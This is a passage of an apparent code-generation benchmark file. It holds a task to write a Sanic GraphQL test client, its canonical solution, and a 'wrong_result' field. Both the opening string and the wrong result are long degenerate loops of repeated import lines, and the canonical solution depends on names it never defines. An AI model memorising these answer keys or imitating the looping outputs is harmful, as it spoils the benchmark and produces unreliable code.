urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, SSLError\nfrom urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool\nfrom urllib3.util.timeout import Timeout\nfrom urllib3.util.retry import Retry\nfrom urllib3.connection import HTTPConnection, HTTPSConnection\nfrom urllib3.util.url import parse_url"
  },
  {
    "Task_id": 213,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client using the Sanic framework, capable of handling GraphQL requests and standard HTTP methods (GET, POST, PATCH, PUT, DELETE). The class should support both query parameters and file uploads, and provide appropriate response handling.\n\nClass Description: The `SanicHttpClient` class is a wrapper around Sanic's ASGI client that simplifies making HTTP requests, particularly for GraphQL endpoints. It handles request construction, header management, and response formatting.\n\nAttributes:\n- app: Sanic - The Sanic application instance used for handling requests\n- graphiql: Optional[bool] - Flag to enable GraphiQL interface\n- graphql_ide: Optional[str] - The GraphQL IDE to use (default: \"graphiql\")\n- allow_queries_via_get: bool - Whether to allow GraphQL queries via GET method\n- result_override: Optional[Any] - Optional result override for testing\n- multipart_uploads_enabled: bool - Flag to enable multipart file uploads\n\nMethods:\n- __init__(graphiql: Optional[bool], graphql_ide: Optional[str], allow_queries_via_get: bool, result_override: Optional[Any], multipart_uploads_enabled: bool) -> None - Initializes the Sanic application and sets up the GraphQL route\n- _graphql_request(method: Literal[\"get\", \"post\"], query: Optional[str], variables: Optional[Dict[str, object]], files: Optional[Dict[str, BytesIO]], headers: Optional[Dict[str, str]], **kwargs: Any) -> Response - Internal method to handle GraphQL requests with proper body construction\n- request(url: str, method: Literal[\"get\", \"post\", \"patch\", \"put\", \"delete\"], headers: Optional[Dict[str, str]]) -> Response - General HTTP request handler\n- get(url: str, headers: Optional[Dict[str, str]]) -> Response - Convenience method for GET requests\n- post(url: str, data: Optional[bytes], json: Optional[Dict], headers: Optional[Dict[str, str]]) -> Response - Convenience method for POST requests with data or JSON payload",
    "Canonical_solution": "from sanic import Sanic\nfrom sanic.request import Request as SanicRequest\nfrom typing import Any, Optional, Literal, Dict\nfrom io import BytesIO\nfrom json import dumps\nfrom random import randint\n\nclass SanicHttpClient:\n    def __init__(\n        self,\n        graphiql: Optional[bool] = None,\n        graphql_ide: Optional[str] = \"graphiql\",\n        allow_queries_via_get: bool = True,\n        result_override: Optional[Any] = None,\n        multipart_uploads_enabled: bool = False,\n    ):\n        self.app = Sanic(f\"test_{int(randint(0, 1000))}\")\n        view = GraphQLView.as_view(\n            schema=schema,\n            graphiql=graphiql,\n            graphql_ide=graphql_ide,\n            allow_queries_via_get=allow_queries_via_get,\n            result_override=result_override,\n            multipart_uploads_enabled=multipart_uploads_enabled,\n        )\n        self.app.add_route(view, \"/graphql\")\n\n    async def _graphql_request(\n        self,\n        method: Literal[\"get\", \"post\"],\n        query: Optional[str] = None,\n        variables: Optional[Dict[str, object]] = None,\n        files: Optional[Dict[str, BytesIO]] = None,\n        headers: Optional[Dict[str, str]] = None,\n        **kwargs: Any,\n    ) -> Response:\n        body = self._build_body(\n            query=query, variables=variables, files=files, method=method\n        )\n\n        if body:\n            if method == \"get\":\n                kwargs[\"params\"] = body\n            elif files:\n                kwargs[\"data\"] = body\n            else:\n                kwargs[\"content\"] = dumps(body)\n\n        request, response = await self.app.asgi_client.request(\n            method,\n            \"/graphql\",\n            headers=self._get_headers(method=method, headers=headers, files=files),\n            files=files,\n            **kwargs,\n        )\n\n        return Response(\n            status_code=response.status_code,\n            data=response.content,\n            headers=response.headers,\n        )\n\n    async def request(\n        self,\n        url: str,\n        method: Literal[\"get\", \"post\", \"patch\", \"put\", \"delete\"],\n        headers: Optional[Dict[str, str]] = None,\n    ) -> Response:\n        request, response = await self.app.asgi_client.request(\n            method,\n            url,\n            headers=headers,\n        )\n\n        return Response(\n            status_code=response.status_code,\n            data=response.content,\n            headers=response.headers,\n        )\n\n    async def get(\n        self,\n        url: str,\n        headers: Optional[Dict[str, str]] = None,\n    ) -> Response:\n        return await self.request(url, \"get\", headers=headers)\n\n    async def post(\n        self,\n        url: str,\n        data: Optional[bytes] = None,\n        json: Optional[Dict] = None,\n        headers: Optional[Dict[str, str]] = None,\n    ) -> Response:\n        body = data or dumps(json)\n        request, response = await self.app.asgi_client.request(\n            \"post\", url, content=body, headers=headers\n        )\n\n        return Response(\n            status_code=response.status_code,\n            data=response.content,\n            headers=response.headers,\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nfrom sanic import Sanic\nfrom sanic.response import json, text\nfrom sanic.exceptions import NotFound\nfrom sanic.request import Request\nfrom sanic.response import HTTPResponse\nfrom sanic.exceptions import SanicException\nfrom sanic.response import StreamingHTTPResponse\nfrom sanic.exceptions import ServerError\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import 